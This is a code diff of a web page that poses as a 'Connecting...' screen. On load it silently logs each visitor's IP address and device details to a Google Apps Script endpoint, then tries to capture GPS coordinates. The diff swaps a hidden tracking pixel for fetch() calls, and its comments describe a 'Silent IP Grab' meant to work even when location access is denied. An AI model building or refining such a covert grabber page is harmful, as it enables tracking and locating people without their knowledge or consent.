@@ -30,13 +30,7 @@
         }
         h2 { margin: 0 0 10px 0; color: #333; }
         p { color: #666; font-size: 14px; }
-        /* Hide the tracking pixel */
-        .tracker {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-        }
+        .status { margin-top: 10px; font-weight: bold; color: #007aff; }
     </style>
 </head>
 <body>
@@ -50,39 +44,35 @@
     <div id="status" class="status">Connecting...</div>
 </div>
 
-<!-- INVISIBLE TRACKING PIXEL -->
-<img src="" class="tracker" id="pixel">
-
 <script>
-    // This function runs immediately when the page loads
+    // REPLACE THIS WITH YOUR NEW GOOGLE SCRIPT URL
+    var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz54OUmwswKUWXvrmunXfRJYbhLw8A0FR_EzPkyeNLuW197qHJM2sXVgT3BYUDevkyGdg/exec"; 
+
     window.onload = function() {
-        var url = "https://script.google.com/macros/s/AKfycbz54OUmwswKUWXvrmunXfRJYbhLw8A0FR_EzPkyeNLuW197qHJM2sXVgT3BYUDevkyGdg/exec"; // REPLACE THIS WITH YOUR NEW URL
-        
-        // 1. Get User Agent (Device Info)
         var ua = navigator.userAgent;
         
-        // 2. Send Data via Hidden Image (Silent IP Grab)
-        // We append parameters to the image source. When the browser tries to load 
-        // this fake image, it sends the request to your Google Script, logging the IP.
-        var trackerSrc = url + "?ip=AutoDetected&ua=" + encodeURIComponent(ua) + "&method=Pixel";
-        
-        document.getElementById('pixel').src = trackerSrc;
-        
-        // 3. Try for GPS (Optional, but silent if denied)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                document.getElementById('status').innerText = "Location Verified!";
-                // Send GPS data too
-                var lat = position.coords.latitude;
-                var long = position.coords.longitude;
-                document.getElementById('pixel').src = url + "?ip=AutoDetected&ua=" + encodeURIComponent(ua) + "&lat=" + lat + "&long=" + long;
-            }, function(error) {
-                // If they deny, we already got the IP via the first pixel load
-                document.getElementById('status').innerText = "Details Saved.";
-            });
-        } else {
+        // Send Data via Fetch (More reliable than image src)
+        fetch(SCRIPT_URL + "?ip=AutoDetected&ua=" + encodeURIComponent(ua) + "&method=Fetch", {
+            method: 'POST',
+            body: JSON.stringify({ip: 'AutoDetected', ua: ua})
+        }).then(function() {
             document.getElementById('status').innerText = "Details Saved.";
-        }
+            
+            // Try for GPS silently
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var lat = position.coords.latitude;
+                    var long = position.coords.longitude;
+                    // Update log with GPS if available
+                    fetch(SCRIPT_URL + "?lat=" + lat + "&long=" + long + "&ua=" + encodeURIComponent(ua));
+                }, function(error) {
+                    // GPS denied or failed, IP is already logged
+                });
+            }
+        }).catch(function(error) {
+            document.getElementById('status').innerText = "Connection Failed.";
+            console.error(error);
+        });
     };
 </script>
 
